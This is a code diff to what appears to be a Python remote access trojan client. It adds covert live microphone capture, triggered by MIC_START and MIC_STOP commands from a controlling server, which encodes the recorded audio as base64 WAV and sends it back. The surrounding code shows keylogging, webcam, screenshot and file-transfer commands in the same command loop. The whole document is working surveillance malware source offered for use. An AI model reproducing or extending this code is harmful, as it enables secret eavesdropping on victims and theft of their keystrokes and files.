@@ -404,6 +404,86 @@ def stop_keylog_stream():
     except Exception:
         pass
 
+# ── Microphone Live-Stream State ─────────────────────────────────────────────────
+_mic_active = False
+_mic_frames = []
+_mic_stream = None
+
+
+def start_mic_stream():
+    """Start InputStream that accumulates audio chunks in memory."""
+    global _mic_active, _mic_frames, _mic_stream
+    _mic_active = True
+    _mic_frames = []
+    import sounddevice as sd
+    import numpy as np
+
+    def callback(indata, frames, time_info, status):
+        if _mic_active:
+            _mic_frames.append(indata.copy())
+
+    _mic_stream = sd.InputStream(samplerate=44100, channels=2, dtype='int16', callback=callback)
+    _mic_stream.start()
+    print("🎤 Mic stream started")
+
+
+def stop_mic_stream():
+    """Stop stream, encode WAV as base64 JSON, return response string."""
+    global _mic_active, _mic_frames, _mic_stream
+    _mic_active = False
+    time.sleep(0.3)
+
+    if _mic_stream is not None:
+        try:
+            _mic_stream.stop()
+        except Exception:
+            pass
+        try:
+            _mic_stream.close()
+        except Exception:
+            pass
+        _mic_stream = None
+
+    if not _mic_frames:
+        _mic_frames = []
+        return json.dumps({"type": "MICROPHONE", "status": "error", "message": "No audio captured"})
+
+    import numpy as np
+    import wave
+    import io
+
+    try:
+        recording = np.concatenate(_mic_frames, axis=0)
+    except Exception:
+        _mic_frames = []
+        return json.dumps({"type": "MICROPHONE", "status": "error", "message": "Failed to concatenate audio frames"})
+
+    sample_rate = 44100
+    channels = 2
+    duration = round(len(recording) / sample_rate, 1)
+
+    buffer = io.BytesIO()
+    with wave.open(buffer, 'wb') as wf:
+        wf.setnchannels(channels)
+        wf.setsampwidth(2)
+        wf.setframerate(sample_rate)
+        wf.writeframes(recording.tobytes())
+
+    audio_data = base64.b64encode(buffer.getvalue()).decode()
+    _mic_frames = []
+
+    return json.dumps({
+        "type": "MICROPHONE",
+        "status": "success",
+        "data": audio_data,
+        "size": len(audio_data),
+        "duration": duration,
+        "sample_rate": sample_rate,
+        "channels": channels,
+        "format": "WAV"
+    })
+
+
 def download_file(filepath):
     """Send file to server"""
     try:
@@ -676,6 +756,16 @@ def main_loop():
                             if cmd.startswith("MICROPHONE:"):
                                 duration = int(cmd.split(":", 1)[1].strip())
                             output = capture_audio(duration).encode()
+                        except Exception as e:
+                            output = json.dumps({"type": "MICROPHONE", "status": "error", "message": str(e)}).encode()
+
+                    elif cmd == "MIC_START":
+                        start_mic_stream()
+                        continue
+
+                    elif cmd == "MIC_STOP":
+                        try:
+                            output = stop_mic_stream().encode()
                         except Exception as e:
                             output = json.dumps({"type": "MICROPHONE", "status": "error", "message": str(e)}).encode()
                     
@@ -965,7 +1055,7 @@ def main_loop():
 
                     client.send(output)
                     
-                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE", "KEYLOG_START", "KEYLOG_STOP")):
+                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE", "KEYLOG_START", "KEYLOG_STOP", "MIC_STOP")):
                         try:
                             time.sleep(0.1)
                             client.send(b"\n}")
